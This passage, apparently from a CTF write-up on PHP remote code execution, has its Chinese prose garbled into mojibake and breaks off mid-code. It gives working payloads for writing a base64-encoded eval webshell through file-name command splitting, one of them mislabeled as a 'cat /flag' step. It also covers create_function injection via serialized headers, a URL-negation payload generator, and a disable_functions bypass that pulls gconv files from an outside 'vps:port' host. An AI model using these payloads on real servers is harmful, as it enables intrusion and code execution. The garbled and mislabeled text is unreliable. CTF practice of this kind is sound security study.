class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ç®€å•æ€è·¯</strong></p><p>å› ä¸ºshell_execèƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ‰€ä»¥å°†éœ€è¦æ‰§è¡Œçš„å‘½ä»¤æ‹†åˆ†ï¼Œä»¥æ–‡ä»¶åçš„å½¢å¼å†™å…¥ï¼Œè¿˜éœ€è¦å†™ä¸€ä¸ªæ–‡ä»¶ç”¨äºå­˜æ”¾<code>ls -th &gt;f</code>ï¼Œç„¶åé€šè¿‡æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œå°†æ–‡ä»¶åå½¢å¼çš„å‘½ä»¤å†™å…¥åˆ°æ–‡ä»¶<code>f</code>ä¸­ï¼Œæœ€åæ‰§è¡Œ<code>f</code>å°±ç›¸å½“äºæ‰§è¡Œäº†å‘½ä»¤</p><p>å‰é¢æˆ‘ä»¬è¯´åˆ°<code>ls -h</code>å‚æ•°çš„ä½¿ç”¨ï¼Œé‚£ä¹ˆ<code>-h</code>ç©¶ç«Ÿæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-hå‚æ•°ä»¥æ˜“è¯»çš„æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶æˆ–ç›®å½•å¤§å°</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸ªä¾‹å­ï¼Œç›®æ ‡æ˜¯æ„é€ <code>ls -t &gt; a</code></p><p>é‚£ä¹ˆåº”è¯¥ä¾æ¬¡æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p>å®é™…æ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031698.png" alt="image-20220831231200664"></p><p>å› ä¸ºlsæ˜¯é»˜è®¤æŒ‰ç…§å­—æ¯é¡ºåºæ¥æ’åºçš„ï¼Œæ‰€ä»¥æ·»ä¸Š-hæ˜¯ä¸ºäº†è®©å‘½ä»¤ä»¥æ­£å¸¸çš„é¡ºåºè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082255810.png" alt="image-20221008225554771"></p><p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œä¸Šé¢è¯´åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lså†™å…¥æ–‡ä»¶ä¸­æ—¶ï¼Œæ¯ä¸ªæ–‡ä»¶åéƒ½æ˜¯å•ç‹¬ä¸€è¡Œï¼Œå®ƒä¼šè‡ªåŠ¨æ¢è¡Œï¼Œæœ‰æ—¶ä¼šå½±å“åˆ°æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œdirä¼šæŠŠå†…å®¹å…¨éƒ¨å†™å…¥ä¸€è¡Œä¸­ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ç©ºæ ¼</span><br></pre></td></tr></table></figure><p>å¦‚åŒè¿™æ ·</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082256154.png" alt="image-20221008225601111"></p><p>ç”¨lsçš„è¯å°±ä¼šå½±å“åˆ°å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œè¦ç”¨diræ¥ä»£æ›¿ls</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        </span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a        </span><br><span class="line">sh a        æœ€åç”¨shæ¥æ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031797.png" alt="image-20220831231137776"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹æ‹†åˆ†å­—ç¬¦ä¸²äº†ï¼Œç¬¬ä¸€ç§å¯ä»¥ç›´æ¥æ„é€ ä¸€å¥è¯æœ¨é©¬,å› ä¸ºæœ‰<code>&lt;,?</code>ï¼Œéœ€è¦å°†å…¶è¿›è¡Œbase64è½¬æ¢ï¼Œè¿™æ ·payloadé‡Œå°±æ²¡æœ‰ç‰¹æ®Šå­—ç¬¦äº†ï¼Œä»¥phpinfoä½œä¸ºä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">æ„é€ </span><br><span class="line">echo PD9waHAgcGhwaW5mbygpOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯å¿…é¡»è¦å°†å…¶ä¸­ä¸€ä¸ªç©ºæ ¼ç”¨<code>$&#123;IFS&#125;</code>ä»£æ›¿ï¼Œå¦åˆ™ä¼šè¢«â€™åƒâ€™æ‰ä¸€ä¸ªç©ºæ ¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031976.png" alt="image-20220831142132429"></p><p>é‚£ä¹ˆpayloadå°±åº”è¯¥è½¬æ¢ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">echo$&#123;IFS&#125;PD9waHAgcGhwaW5mbygpOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure><p>æ‹†åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;ec\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;cG\\</span><br><span class="line">&gt;hw\\</span><br><span class="line">&gt;aW\\</span><br><span class="line">&gt;5m\\</span><br><span class="line">&gt;by\\</span><br><span class="line">&gt;gp\\</span><br><span class="line">&gt;Ow\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;hp</span><br></pre></td></tr></table></figure><p>å› ä¸ºls -tæŒ‰æ—¶é—´å…ˆåé¡ºåºæ’åºï¼Œæ‰€ä»¥éœ€è¦å€’ç½®ï¼ŒåŒæ—¶åŠ ä¸Š<code>ls -ht &gt; a</code>çš„æ„é€  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;Ow\\</span><br><span class="line">&gt;gp\\</span><br><span class="line">&gt;by\\</span><br><span class="line">&gt;5m\\</span><br><span class="line">&gt;aW\\</span><br><span class="line">&gt;hw\\</span><br><span class="line">&gt;cG\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;ec\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>æˆåŠŸå†™å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082257280.png" alt="image-20221008225715238"></p><p>ç¬¬äºŒç§å¯ä»¥ç›´æ¥æ„é€ <code>cat /flag</code>ï¼Œæ–¹æ³•åŒä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /flag   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">æ„é€ </span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure><p>æœ€åæ‰§è¡Œ<code>sh 1.php</code>å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031577.png" alt="image-20220831233101265"></p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>ä¸€äº›ä¸çŸ¥é“æ€ä¹ˆåˆ†ç±»çš„rceé¢˜ç›®â€¦</p><h2 id="SCTF-2021-rceme"><a href="#SCTF-2021-rceme" class="headerlink" title="[SCTF 2021]rceme"></a>[SCTF 2021]rceme</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Try harder!\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ— å‚æ•°æ— å­—æ¯rceï¼Œä¸”æœ‰disable_function</p><p>å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$functions</span> = <span class="title function_ invoke__">get_defined_functions</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$disable_func_str</span> = <span class="string">&quot;&quot;</span>; <span class="comment">//eg. system,passthru,exec...</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$array</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$disable_func_str</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$functions</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$function</span>, <span class="variable">$array</span>) &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;curl&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;wddx&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;mcrypt&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;cli&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;odbc&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;bc&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;image&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title function_ invoke__">startsWith</span>(<span class="variable">$function</span>, <span class="string">&#x27;ereg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$function</span>&quot;</span> . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startsWith</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$prefix</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$prefix</span>)) === <span class="variable">$prefix</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸‹é¢å‡ ä¸ªå‡½æ•°å¯ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">strlen</span><br><span class="line">error_reporting</span><br><span class="line">set_error_handler</span><br><span class="line">create_function</span><br><span class="line">split</span><br><span class="line">spliti</span><br><span class="line">sql_regcase</span><br><span class="line">mdecrypt_generic</span><br><span class="line">preg_match</span><br><span class="line">preg_replace</span><br><span class="line">phpinfo</span><br><span class="line">strstr</span><br><span class="line">escapeshellarg</span><br><span class="line">getenv</span><br><span class="line">putenv</span><br><span class="line">magic_quotes_runtime</span><br><span class="line">set_magic_quotes_runtime</span><br><span class="line">call_user_func</span><br><span class="line">call_user_method</span><br><span class="line">call_user_method_array</span><br><span class="line">unserialize</span><br><span class="line">var_dump</span><br><span class="line">highlight_file</span><br><span class="line">show_source</span><br><span class="line">ini_get</span><br><span class="line">set_socket_blocking</span><br><span class="line">mail</span><br><span class="line">end</span><br><span class="line">dl</span><br></pre></td></tr></table></figure><h3 id="create-function-å¯å˜å‚æ•°"><a href="#create-function-å¯å˜å‚æ•°" class="headerlink" title="create_function+å¯å˜å‚æ•°"></a>create_function+å¯å˜å‚æ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//create_functionæ³¨å…¥</span></span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#125;eval(phpinfo());//&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯å˜å‚æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">...<span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$n</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>); <span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p>é…åˆunserializeæ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(...<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())));</span><br></pre></td></tr></table></figure><p>headerså¤´éšä¾¿ä¼ ä¸€ä¸ªï¼Œå€¼ä¸ºä¸€ä¸ªåºåˆ—åŒ–å‚æ•°æ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$arr</span>=[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#125;eval($_POST[0]);//&#x27;</span>];</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//a:2:&#123;i:0;s:0:&quot;&quot;;i:1;s:19:&quot;&#125;eval($_POST[0]);//&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="urlå–å-1"><a href="#urlå–å-1" class="headerlink" title="urlå–å"></a>urlå–å</h3><p>æœªè¿‡æ»¤<code>~</code>ï¼Œæ— å­—æ¯æ•°å­—ç”¨urlå–å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="comment"># /usr/bin/python3</span></span><br><span class="line"><span class="comment"># @Author:Firebasky</span></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">urlbm</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fun = <span class="built_in">input</span>(<span class="string">&quot;Firebasky&gt;: &quot;</span>).strip(<span class="string">&quot;)&quot;</span>).split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> fun[:-<span class="number">1</span>]:</span><br><span class="line">        exp += urlbm(each)</span><br><span class="line">        <span class="built_in">print</span>(exp)</span><br><span class="line">    exp += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(fun) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCMqMTI"><img src="https://s1.ax1x.com/2023/06/16/pCMqMTI.png" alt="pCMqMTI.png"></a></p><p>æˆåŠŸæ‰§è¡Œ</p><p><a href="https://imgse.com/i/pCMq1tP"><img src="https://s1.ax1x.com/2023/06/16/pCMq1tP.png" alt="pCMq1tP.png"></a></p><h3 id="DirectoryIteratoråˆ—ç›®å½•"><a href="#DirectoryIteratoråˆ—ç›®å½•" class="headerlink" title="DirectoryIteratoråˆ—ç›®å½•"></a>DirectoryIteratoråˆ—ç›®å½•</h3><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="number">0</span>=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCMq0kq"><img src="https://s1.ax1x.com/2023/06/16/pCMq0kq.png" alt="pCMq0kq.png"></a></p><p>æœ‰<code>/readflag</code>ï¼Œéœ€è¦å‘½ä»¤æ‰§è¡Œ</p><h3 id="GCONV-PATH-iconv-bypass-disable-functions"><a href="#GCONV-PATH-iconv-bypass-disable-functions" class="headerlink" title="GCONV_PATH + iconv bypass disable_functions"></a>GCONV_PATH + iconv bypass disable_functions</h3><p>å‚è€ƒ<a href="https://blog.csdn.net/qq_42303523/article/details/117911859">ä½¿ç”¨GCONV_PATHä¸iconvè¿›è¡Œbypass disable_functions</a></p><h4 id="SplFileObjectå†™æ–‡ä»¶"><a href="#SplFileObjectå†™æ–‡ä»¶" class="headerlink" title="SplFileObjectå†™æ–‡ä»¶"></a>SplFileObjectå†™æ–‡ä»¶</h4><p>æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œåˆ©ç”¨åŸç”Ÿç±»SplFileObjectå†™å…¥æ–‡ä»¶ï¼Œæ‰€éœ€ä¸Šä¼ æ–‡ä»¶æ”¾æœåŠ¡å™¨ä¸Šï¼Œpythonå¼€ä¸ªæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9333</span><br></pre></td></tr></table></figure><p><strong>ä¸Šä¼ gconv-modulesæ–‡ä»¶äº&#x2F;tmp</strong></p><p><strong>gconv-modules</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2</span><br><span class="line">module  INTERNAL    EXP//    ../../../../../../../../tmp/exp    2</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="number">0</span>=<span class="variable">$url</span>=<span class="string">&quot;http://vps:port/gconv-modules&quot;</span>;<span class="variable">$file1</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>,<span class="string">&#x27;r&#x27;</span>);<span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">while</span>(!<span class="variable">$file1</span>-&gt;<span class="title function_ invoke__">eof</span>())&#123;<span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$file1</span>-&gt;<span class="title function_ invoke__">fgets</span>();&#125;<span class="variable">$file2</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/gconv-modules&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);<span class="variable">$file2</span>-&gt;<span class="title function_ invoke__">fwrite</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><strong>ä¸Šä¼ exp.soæ–‡ä»¶äº&#x2F;tmp</strong></p><p>ç”Ÿæˆexp.so</p><p>exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> 